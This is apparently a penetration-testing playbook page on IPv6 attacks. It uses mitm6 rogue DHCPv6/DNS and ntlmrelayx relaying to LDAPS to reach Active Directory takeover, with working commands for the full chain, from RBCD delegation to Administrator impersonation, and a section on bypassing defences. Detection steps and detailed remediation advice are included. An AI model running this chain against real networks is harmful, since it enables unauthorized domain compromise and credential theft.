# IPv6 Attacks — mitm6 / SLAAC / DHCPv6

> IPv4-only networks frequently have IPv6 enabled-but-unmanaged on Windows hosts. Attacker on the segment serves rogue DHCPv6 + DNS → all v6 traffic flows through attacker → relay NTLM → AD takeover. Authorized testing only.

## TL;DR
- Windows clients prefer IPv6 over IPv4 when both work, and they auto-configure via DHCPv6 / RA / SLAAC. Without a real v6 router on the LAN, an attacker becomes the only v6 router.
- `mitm6` (https://github.com/dirkjanm/mitm6) crafts the rogue DHCPv6 + RA → victim uses attacker as DNS for `target.tld` → attacker answers with their IP → connections from victims to internal services land at attacker → `ntlmrelayx.py` relays the auth.
- Combined with WPAD discovery: victim's "Web Proxy Auto-Discovery" tries `http://wpad.<domain>/wpad.dat` over v6 → attacker serves a proxy.dat → all victim HTTP traffic proxied.
- Defence: disable IPv6 if unused, or deploy a real v6 router; enforce LDAP signing + channel binding to neuter the relay step.

## Detection / Discovery

### Is IPv6 on the wire?
```bash
sudo tcpdump -ni eth0 -c 50 ip6
# Look for ICMPv6 router solicitations / neighbor advertisements
# Most networks: yes, IPv6 link-local is on by default
```

### Are there real DHCPv6 / RA from the legit network?
```bash
sudo tcpdump -ni eth0 -c 20 'icmp6 and ip6[40] == 134'    # Router Advertisements
sudo tcpdump -ni eth0 -c 20 'udp port 547'                # DHCPv6 server -> client
# No RA + no DHCPv6 server messages = greenfield for mitm6
```

## Exploitation

### mitm6 — rogue DHCPv6 + DNS
```bash
sudo apt install python3-pip
pip3 install mitm6

# Run; -d <target-domain> tells mitm6 which DNS queries to spoof
sudo mitm6 -i eth0 -d target.tld
```

mitm6 effect:
- Sends RAs claiming a fake v6 prefix.
- Answers DHCPv6 INFORMATION-REQUEST / SOLICIT → victims get attacker as DNS.
- DNS queries for `*.target.tld` → answered with attacker's link-local v6 address.

### Combined with `ntlmrelayx.py`
```bash
# In one terminal
sudo mitm6 -i eth0 -d target.tld

# In another terminal — listen for inbound HTTP/SMB and relay to a high-value target
sudo ntlmrelayx.py -6 -wh attacker.target.tld \
   -t ldaps://dc.target.tld \
   --delegate-access --no-smb-server
```
`-wh attacker.target.tld` is the WPAD-host name (must resolve in the victim's view — mitm6 ensures it does).

When victim's Windows machine queries `http://wpad.target.tld/wpad.dat`, mitm6 replies with attacker's IP, browser fetches the WPAD config, then routes HTTP via attacker's proxy → ntlmrelayx captures the NTLM auth → relays to LDAPS → creates a new computer account / grants RBCD permissions → full AD path.

### `--delegate-access` flow
After relay to LDAPS:
1. ntlmrelayx creates a fake computer account on AD.
2. Adds RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`) from the victim machine to the fake.
3. Output: "set up RBCD for VICTIM$ — now use `getST.py` to impersonate any user as that machine."
4. Operator runs `getST.py -spn cifs/victim.target.tld -impersonate Administrator`.
5. PsExec into the victim as Administrator.

See [../ad-infrastructure/kerberos.md](../ad-infrastructure/kerberos.md) for the Kerberos side.

### SLAAC alone (no DHCPv6)
A simpler attack — just send RAs with attacker's MAC as the router. Some hosts honor RA-only v6 config. Less reliable than mitm6's combined approach because Windows doesn't accept DNS from RA alone (RDNSS option support varies).

## Bypasses (against defender countermeasures)
- IPv6 disabled on clients → attack fails at step 1. Many admins disable Teredo / 6to4 but leave native v6 on.
- LDAP signing + channel binding required on DCs → ntlmrelayx LDAP relay fails. Pivot to SMB relay if SMB signing is also missing (rare in 2025 — most orgs have SMB signing on at least DCs).
- DNS forwarder on the network configured for IPv6 with strict scoping → attacker's DNS queries get a longer-than-expected response window; mitm6 needs to win the race vs legit resolution.

## Defence / Remediation
- **Disable IPv6 on Windows endpoints** if unused: GPO Computer → Policies → Admin Templates → Network → TCPIPv6 (or registry `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\DisabledComponents=0xff`). Microsoft does **not** recommend full disable; the safer move is "manage v6 properly".
- **Deploy a managed IPv6** with real RA + DHCPv6 from a router you control. Then mitm6's RAs get ignored (well-configured Windows prefers the existing default).
- **RA Guard** on switches (IPv6 equivalent of DHCP Snooping) — drops RA from untrusted ports.
- **DHCPv6 Guard** — same idea for DHCPv6 server messages.
- **LDAP signing required** + **LDAP channel binding required** on DCs (audit events 2887, 2889 first; enforce after) — defeats the LDAP-relay leg of the chain.
- **SMB signing required** everywhere — defeats SMB-relay leg.
- **EPA (Extended Protection for Authentication)** on AD CS web enrollment, OWA, ADFS — closes additional NTLM-relay targets.
- **Disable WPAD**: GPO Computer → Admin Templates → Network → "Disable Web Proxy Auto-Discovery Protocol". Eliminates the wpad.target.tld pivot.
- **Disable NetBIOS over TCP/IP + LLMNR + mDNS** on endpoints (see [./llmnr-nbtns-responder.md](./llmnr-nbtns-responder.md)) so attacker has fewer name-resolution oracles to abuse.

## Sources
- mitm6 + accompanying write-up (Dirk-jan Mollema, Fox-IT 2018): https://github.com/dirkjanm/mitm6 and https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/
- Impacket ntlmrelayx: https://github.com/fortra/impacket
- Microsoft — IPv6 Configuration Guidance (DisabledComponents): registry key `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\DisabledComponents` (see Microsoft Learn for current article)
- Microsoft — Manage LDAP Signing: https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-signing-in-windows-server
- Microsoft — LDAP Channel Binding: https://msrc.microsoft.com/update-guide/vulnerability/ADV190023
- Cisco — IPv6 First Hop Security (RA Guard, DHCPv6 Guard): https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/ipv6_fhsec/configuration/15-sy/ip6f-15-sy-book.html
- HackTricks mitm6: https://book.hacktricks.wiki/en/network-services-pentesting/spoofing-llmnr-nbtns-mdns-dns-and-wpad-and-relay-attacks.html
- MITRE ATT&CK T1557.001 LLMNR / NBT-NS / mitm6 — Adversary-in-the-Middle: https://attack.mitre.org/techniques/T1557/001/
